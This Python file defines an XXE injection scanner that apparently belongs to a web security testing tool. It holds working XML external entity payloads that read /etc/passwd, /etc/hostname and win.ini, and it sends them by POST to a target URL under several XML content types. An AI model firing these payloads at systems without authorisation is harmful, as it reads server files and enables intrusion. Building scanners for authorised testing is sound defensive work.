import requests
from colorama import Fore


class XXEScanner:
    """XML External Entity (XXE) Injection Scanner (A05:2025 - Injection)."""

    def __init__(self):
        self.xxe_payloads = [
            {
                "name": "File Read (Linux)",
                "xml": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
                "check": "root:x:",
            },
            {
                "name": "File Read (Windows)",
                "xml": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><data>&xxe;</data></root>',
                "check": "[fonts]",
            },
            {
                "name": "XXE Detection (Entity Expansion)",
                "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_CANARY_DETECTED">]><root><data>&xxe;</data></root>',
                "check": "XXE_CANARY_DETECTED",
            },
            {
                "name": "XXE via Parameter Entity",
                "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname"><!ENTITY callhome "%xxe;">]><root>&callhome;</root>',
                "check": None,  # Blind - check for errors
            },
        ]
        self.content_types = [
            "application/xml",
            "text/xml",
            "application/xhtml+xml",
            "application/soap+xml",
        ]

    def scan(self, target_url):
        print(f"{Fore.CYAN}[*] Checking for XXE Injection on {target_url}...")
        findings = []

        # Test 1: POST XML payloads to the target
        for ct in self.content_types:
            for payload in self.xxe_payloads:
                result = self._test_xxe(target_url, payload, ct)
                if result:
                    findings.append(result)
                    break  # One proof per content-type is enough
            if findings:
                break

        # Test 2: Check if target accepts XML (even if no vuln found)
        if not findings:
            xml_accepted = self._probe_xml_support(target_url)
            if xml_accepted:
                print(f"{Fore.YELLOW}[!] Target accepts XML input (potential XXE surface).")

        if not findings:
            print(f"{Fore.GREEN}[-] No XXE vulnerabilities found.")
        return findings

    def _test_xxe(self, url, payload, content_type):
        try:
            headers = {"Content-Type": content_type}
            res = requests.post(url, data=payload["xml"], headers=headers, timeout=10)

            # Check for content-based detection
            if payload["check"] and payload["check"] in res.text:
                print(f"{Fore.RED}[!!!] XXE Found: {payload['name']}!")
                return {
                    "type": f"XXE Injection ({payload['name']})",
                    "cwe": "CWE-611",
                    "details": f"XML External Entity injection successful via {content_type}. "
                               f"Signature '{payload['check']}' found in response.",
                    "url": url,
                    "payload": payload["xml"][:200] + "..."
                }

            # Check for XML parsing errors (blind XXE indicators)
            error_indicators = [
                "xml parsing error", "xml syntax error", "entity",
                "dtd", "doctype", "xmlparseentity", "parser error",
                "simplexml", "lxml", "saxparseexception",
                "javax.xml", "org.xml.sax", "xerces",
            ]
            body = res.text.lower()
            if any(ind in body for ind in error_indicators):
                # Parser is processing our XML - potential blind XXE
                matched = [i for i in error_indicators if i in body]
                print(f"{Fore.YELLOW}[!] XML Parser detected (blind XXE potential): {matched[:3]}")
                return {
                    "type": f"Potential Blind XXE ({payload['name']})",
                    "cwe": "CWE-611",
                    "details": f"XML parser errors detected: {matched[:3]}. "
                               f"Server processes XML entities (Content-Type: {content_type}).",
                    "url": url,
                    "payload": payload["xml"][:200] + "..."
                }

        except Exception:
            pass
        return None

    def _probe_xml_support(self, url):
        """Check if the endpoint accepts XML at all."""
        try:
            test_xml = '<?xml version="1.0"?><root><test>probe</test></root>'
            for ct in self.content_types:
                res = requests.post(url, data=test_xml, headers={"Content-Type": ct}, timeout=5)
                if res.status_code in [200, 400, 415, 500]:
                    # 415 = Unsupported Media Type (doesn't accept XML)
                    if res.status_code != 415:
                        return True
        except Exception:
            pass
        return False
